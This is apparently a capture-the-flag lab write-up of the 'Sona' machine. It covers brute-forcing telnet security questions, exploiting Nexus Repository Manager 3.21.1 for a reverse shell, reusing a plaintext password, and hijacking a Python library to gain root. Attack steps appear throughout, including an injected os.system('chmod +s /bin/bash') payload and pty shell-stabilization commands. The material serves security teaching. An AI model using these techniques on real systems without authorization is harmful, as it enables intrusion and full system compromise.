### Sona Proving Grounds

### Difficulty = Intermediate

### IP Address = 192.168.232.159

Nmap Scan:

```
# Nmap 7.92 scan initiated Fri Feb 24 05:39:13 2023 as: nmap -sCV -A -p23,8081 -oN nmapscan -Pn 192.168.232.159
Nmap scan report for 192.168.232.159
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  telnet?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|     RESTORE Restore backup
|     Incorrect
|   NULL, tn3270: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|_    RESTORE Restore backup
8081/tcp open  http    Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.1-01 (OSS)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 24 05:39:45 2023 -- 1 IP address (1 host up) scanned in 31.73 seconds
```

From the scan we see that theres only 2 ports open

We have a telnet service running an a web http server

#### Enumerating Port 23

Checking it shows this

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
HINT
1.What is your zodiac sign?
2.What is your favorite color?
lol
Incorrect
Connection closed by foreign host.
```

It looks interesting and from this what we would likely want to get is the admin password

But on problem it requires password

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
RECOVER
Please Enter Password
RECOVER <password>
RECOVER lol
Incorrect
Connection closed by foreign host.
```

From the hint it seems like if we get it we will be given a password 

Searching for the meaning of zodiac and the examples leads [here](https://www.britannica.com/topic/zodiac)

There are different types of examples given so i just put it in a script to get the correct one instead of doing it manually [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/sona/zodiac_brute.py)

I got issues with receiving the correct value cause of new lines i couldn't figure it out but hey it works in debug mode 😜

Running it shows that the correct value of the zodiac sign is `leo`

```
─$ python3 zodaicbrute.py
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x6 bytes:
    b'aries\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xf6 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'tauras\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'gemini\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xf6 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'cancer\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[-] Receiving all data: Failed
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
```

Here's the right value

```
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[-] Receiving all data: Failed
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
 ```
 
 Cool we can also verify it by inputting the value from the telnet session
 
 ```
 └─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
leo
Correct!
hey
Incorrect
Connection closed by foreign host.
```

Now we need the favourite colour I made another brute force script which also i had issues with lines lol

Here's the script [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/sona/color_brute.py)

Running it shows that the colour is `black`

```
└─$ python3 color.py
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x5 bytes:
    b'blue\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x7 bytes:
    b'yellow\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'green\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x7 bytes:
    b'indigo\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'white\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'black\n'
[-] Receiving all data: Failed
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
 ```
 
 Here's it 
 
 ```
 [+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'black\n'
[-] Receiving all data: Failed
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
  ```
  
  Now lets see what happens after putting the two correct values
  
  ```
  ┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Sona]
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
leo
Correct!
black
Correct!
RECOVER leoblack
Incorrect
Connection closed by foreign host.
```

I know that the required password is correct but no i need the password to access the RECOVER function 

After trying few combinations of `leo` & `black` It lead me to the correct one which is `blackleo`

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
blackleo
3e409e89-514c-4f9f-955e-dfa5c4083518
```

Now lets go back to the web server

#### Web Server Enumeration

On heading to the web server shows an instance of nexus respository manager
![image](https://user-images.githubusercontent.com/113513376/221117659-42628ea0-0ffb-4c92-afcc-013cb49ffeb9.png)

Trying to login with the cred `admin:3e409e89-514c-4f9f-955e-dfa5c4083518` works
![image](https://user-images.githubusercontent.com/113513376/221117838-680bdf4a-421a-404f-a7af-1ee885ed4fdc.png)

Noticing the top of the web server shows this `OSS 3.21.1-1 `

Searching for exploit leads here [Exploit](https://www.exploit-db.com/exploits/49385)

I had to tweak the exploit code to this [Tweaked_Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/sona/exploit.py)

With this i'll host a python web server on port 80 which has the content of a reverse shell in its cwd

Running the exploit pops the shell
![image](https://user-images.githubusercontent.com/113513376/221120955-de78725e-f587-4ada-a8da-b7fbaf473192.png)

I will stabilize the shell using:

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```

There are two user's on the box 

```
nexus@sona:~/nexus-3.21.1-01$ id
uid=1000(nexus) gid=1000(nexus) groups=1000(nexus)
nexus@sona:~/nexus-3.21.1-01$ ls -al
total 104
drwxrwxr-x  9 nexus nexus  4096 Feb 10  2021 .
drwxr-xr-x  5 nexus nexus  4096 Feb 10  2021 ..
drwxrwxr-x  3 nexus nexus  4096 Feb 10  2021 bin
drwxrwxr-x  2 nexus nexus  4096 Feb 10  2021 deploy
drwxrwxr-x  7 nexus nexus  4096 Feb 10  2021 etc
drwxrwxr-x  2 nexus nexus  4096 Feb 10  2021 .install4j
drwxrwxr-x  5 nexus nexus  4096 Feb 10  2021 lib
-rw-r--r--  1 nexus nexus   395 Feb 19  2020 NOTICE.txt
-rw-r--r--  1 nexus nexus 17321 Feb 19  2020 OSS-LICENSE.txt
-rw-r--r--  1 nexus nexus 41954 Feb 19  2020 PRO-LICENSE.txt
drwxrwxr-x  3 nexus nexus  4096 Feb 10  2021 public
drwxrwxr-x 21 nexus nexus  4096 Feb 10  2021 system
nexus@sona:~/nexus-3.21.1-01$ ls /home
nexus  sona
nexus@sona:~/nexus-3.21.1-01$ 
```

Lets escalate to user sona

Checking the directory system shows a users.xml file which contains user sona password

```
nexus@sona:~/nexus-3.21.1-01$ ls /home
nexus  sona
nexus@sona:~/nexus-3.21.1-01$ cd system/
nexus@sona:~/nexus-3.21.1-01/system$ ls -al
total 92
drwxrwxr-x 21 nexus nexus 4096 Feb 10  2021 .
drwxrwxr-x  9 nexus nexus 4096 Feb 10  2021 ..
drwxrwxr-x 18 nexus nexus 4096 Feb 10  2021 com
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-beanutils
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-cli
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-codec
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-collections
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-digester
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-fileupload
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-io
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-lang
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 commons-validator
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 eu
drwxrwxr-x  6 nexus nexus 4096 Feb 10  2021 io
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 jakarta
drwxrwxr-x  9 nexus nexus 4096 Feb 10  2021 javax
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 joda-time
drwxrwxr-x  4 nexus nexus 4096 Feb 10  2021 net
drwxrwxr-x 26 nexus nexus 4096 Feb 10  2021 org
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 se
-rw-r--r--  1 nexus nexus   12 Feb 19  2020 settings.xml
drwxrwxr-x  3 nexus nexus 4096 Feb 10  2021 uk
-rw-r--r--  1 root  root    89 Feb 10  2021 users.xml
nexus@sona:~/nexus-3.21.1-01/system$ cat users.xml 
<users>
<id>1001</id>
<username>sona</username>
<password>KuramaThe9</password>
</users>
nexus@sona:~/nexus-3.21.1-01/system$ 
```

I'll switch to the user using the cred `sona:KuramaThe9`

```
nexus@sona:~/nexus-3.21.1-01/system$ su sona
Password: 
$ id
uid=1001(sona) gid=1001(sona) groups=1001(sona)
$ bash
sona@sona:/home/nexus/nexus-3.21.1-01/system$ cd /home/sona/
sona@sona:~$ ls -al
total 28
dr-xr-xr-x 2 sona sona 4096 Feb 10  2021 .
drwxr-xr-x 4 root root 4096 Feb 10  2021 ..
lrwxrwxrwx 1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 sona sona  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sona sona 3771 Feb 25  2020 .bashrc
-r--r--r-- 1 sona sona   33 Feb 24 16:22 local.txt
-r-xr----- 1 root sona  210 Feb 10  2021 logcrypt.py
-rw-r--r-- 1 sona sona  807 Feb 25  2020 .profile
sona@sona:~$
```

I uploaded pspy to the target and on running it shows that cron is running as root on the file `/home/sona/logcrypt.py'

```
2023/02/24 16:37:01 CMD: UID=0    PID=4081   | /usr/sbin/CRON -f 
2023/02/24 16:37:01 CMD: UID=0    PID=4082   | 
2023/02/24 16:37:01 CMD: UID=0    PID=4083   | 
2023/02/24 16:38:01 CMD: UID=0    PID=4109   | /usr/sbin/CRON -f 
2023/02/24 16:38:01 CMD: UID=0    PID=4110   | /usr/sbin/CRON -f 
2023/02/24 16:38:01 CMD: UID=0    PID=4111   | python3 /home/sona/logcrypt.py 
```

Since we are user sona we can view the file. Here's its content

```
#!/usr/bin/python3

import base64

log_file = open('/var/log/auth.log','rb')
crypt_data = base64.b64encode(log_file.read())
cryptlog_file = open('/tmp/log.crypt','wb')
cryptlog_file.write(crypt_data)
```

Here's what it does

```
1. Opens the auth.log file 
2. Read its content and base64 encodes it
3. Creates a file log.crypt in the /tmp directory
4. Writes the content of the encoded log file
```

Nothing much goin on here

Checking the permission on the file shows that only root can edit it 

```
sona@sona:~$ ls -l logcrypt.py 
-r-xr----- 1 root sona 210 Feb 10  2021 logcrypt.py
sona@sona:~$
```

That means we can't manipulate it 

So from here what i'll try is a python library hijack since it imports base64

I will search for the file using find command

```
sona@sona:~$ find / -type f -name base64.py 2>/dev/null
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/core18/1988/usr/lib/python3.6/base64.py
/snap/lxd/21029/lib/python2.7/base64.py
/snap/lxd/19188/lib/python2.7/base64.py
/usr/lib/python3.8/base64.py
sona@sona:~$
```

We see its path `/usr/lib/python3.8/base64.py`

Checking the permission shows we have full access over it

```
sona@sona:~$ ls -l /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20380 Jul 28  2020 /usr/lib/python3.8/base64.py
sona@sona:~$ 
```

Now i will edit the file and add

```
import os
os.system('chmod +s /bin/bash')
```

Here's the edited one

```
sona@sona:~$ cat /usr/lib/python3.8/base64.py | head -n 15
#! /usr/bin/python3.8

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""

# Modified 04-Oct-1995 by Jack Jansen to use binascii module
# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

import re
import struct
import binascii
import os

os.system('chmod +s /bin/bash')

sona@sona:~$ 
```

Here's whats going to happen

After crons runs , the script will be executed and since the script does

```
import base64
```

It will get the file content of `/usr/lib/python3.8/base64.py` and import it to the script which will be executed

Since we add a malicious command to it, the command will be executed also

After since minutes on checking the perm for `/bin/bash` shows that its an suid binary

```
sona@sona:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
sona@sona:~$ 
```

From here we can get root

```
sona@sona:~$ bash -p
bash-5.0# id
uid=1001(sona) gid=1001(sona) euid=0(root) egid=0(root) groups=0(root),1001(sona)
bash-5.0# cd /root
bash-5.0# ls -al
total 40
drwx------  6 root root 4096 Feb 24 16:22 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug 19  2021 .cache
drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-r--------  1 root root   33 Feb 24 16:22 proof.txt
-rw-------  1 root root 1725 Feb 10  2021 server.py
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
drwx------  2 root root 4096 Jan  7  2021 .ssh
bash-5.0# cat proof.txt
0a47a5c14b22a0bb0824ae369cde1157
bash-5.0#
```

And we're done 🤓

<br> <br>
[Back To Home](../../index.md)








 


